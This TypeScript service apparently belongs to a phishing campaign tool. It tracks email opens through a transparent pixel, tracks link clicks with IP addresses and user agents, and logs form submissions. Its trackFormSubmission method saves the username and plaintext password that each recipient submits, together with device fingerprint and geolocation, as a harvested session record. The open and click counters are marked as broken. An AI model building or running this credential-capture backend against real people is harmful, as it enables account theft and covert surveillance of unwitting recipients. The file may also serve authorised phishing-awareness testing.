import { storage } from './storage';

export interface ClickTrackingData {
  campaignId: string;
  recipientId: string;
  url: string;
  timestamp: Date;
  userAgent?: string;
  ipAddress?: string;
}

export interface OpenTrackingData {
  campaignId: string;
  recipientId: string;
  timestamp: Date;
  userAgent?: string;
  ipAddress?: string;
}

export class TrackingService {
  async trackEmailOpen(data: OpenTrackingData): Promise<void> {
    try {
      // Update recipient with open data
      await storage.updateRecipient(data.recipientId, {
        status: 'opened',
        openedAt: data.timestamp,
        openCount: await this.incrementOpenCount(data.recipientId),
        userAgent: data.userAgent,
        ipAddress: data.ipAddress,
      });

      console.log(`Email opened: Campaign ${data.campaignId}, Recipient ${data.recipientId}`);
    } catch (error) {
      console.error('Failed to track email open:', error);
    }
  }

  async trackLinkClick(data: ClickTrackingData): Promise<void> {
    try {
      // Update recipient with click data
      await storage.updateRecipient(data.recipientId, {
        status: 'clicked',
        clickedAt: data.timestamp,
        clickCount: await this.incrementClickCount(data.recipientId),
        userAgent: data.userAgent,
        ipAddress: data.ipAddress,
      });

      console.log(`Link clicked: Campaign ${data.campaignId}, Recipient ${data.recipientId}, URL: ${data.url}`);
    } catch (error) {
      console.error('Failed to track link click:', error);
    }
  }

  async trackFormSubmission(
    campaignId: string,
    recipientId: string,
    formData: Record<string, any>,
    sessionData: {
      ipAddress: string;
      userAgent?: string;
      deviceFingerprint?: any;
      geolocation?: any;
    }
  ): Promise<string> {
    try {
      // Update recipient status
      await storage.updateRecipient(recipientId, {
        status: 'submitted',
        submittedAt: new Date(),
      });

      // Create session record
      const session = await storage.createSession({
        campaignId,
        ipAddress: sessionData.ipAddress,
        userAgent: sessionData.userAgent || 'Unknown',
        username: formData.username || formData.email || '',
        password: formData.password || '',
        status: 'complete',
        completionPercentage: 100,
        additionalData: formData,
        deviceFingerprint: sessionData.deviceFingerprint,
        geolocation: sessionData.geolocation,
        completedAt: new Date(),
      });

      console.log(`Form submitted: Campaign ${campaignId}, Recipient ${recipientId}, Session ${session.id}`);
      return session.id!;
    } catch (error) {
      console.error('Failed to track form submission:', error);
      throw error;
    }
  }

  private async incrementOpenCount(recipientId: string): Promise<number> {
    try {
      const recipient = await storage.getRecipients(''); // This needs to be fixed
      const current = recipient.find(r => r.id === recipientId)?.openCount || 0;
      return current + 1;
    } catch {
      return 1;
    }
  }

  private async incrementClickCount(recipientId: string): Promise<number> {
    try {
      const recipient = await storage.getRecipients(''); // This needs to be fixed
      const current = recipient.find(r => r.id === recipientId)?.clickCount || 0;
      return current + 1;
    } catch {
      return 1;
    }
  }

  generateTrackingPixel(): Buffer {
    // Return a 1x1 transparent PNG
    const transparentPixel = Buffer.from(
      'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==',
      'base64'
    );
    return transparentPixel;
  }

  async getTrackingStats(campaignId: string): Promise<{
    totalSent: number;
    totalOpened: number;
    totalClicked: number;
    totalSubmitted: number;
    openRate: number;
    clickRate: number;
    submissionRate: number;
  }> {
    try {
      const recipients = await storage.getRecipients(campaignId);
      
      const totalSent = recipients.filter(r => r.status !== 'pending').length;
      const totalOpened = recipients.filter(r => r.openedAt).length;
      const totalClicked = recipients.filter(r => r.clickedAt).length;
      const totalSubmitted = recipients.filter(r => r.submittedAt).length;

      return {
        totalSent,
        totalOpened,
        totalClicked,
        totalSubmitted,
        openRate: totalSent > 0 ? (totalOpened / totalSent) * 100 : 0,
        clickRate: totalSent > 0 ? (totalClicked / totalSent) * 100 : 0,
        submissionRate: totalSent > 0 ? (totalSubmitted / totalSent) * 100 : 0,
      };
    } catch (error) {
      console.error('Failed to get tracking stats:', error);
      return {
        totalSent: 0,
        totalOpened: 0,
        totalClicked: 0,
        totalSubmitted: 0,
        openRate: 0,
        clickRate: 0,
        submissionRate: 0,
      };
    }
  }
}

export const trackingService = new TrackingService();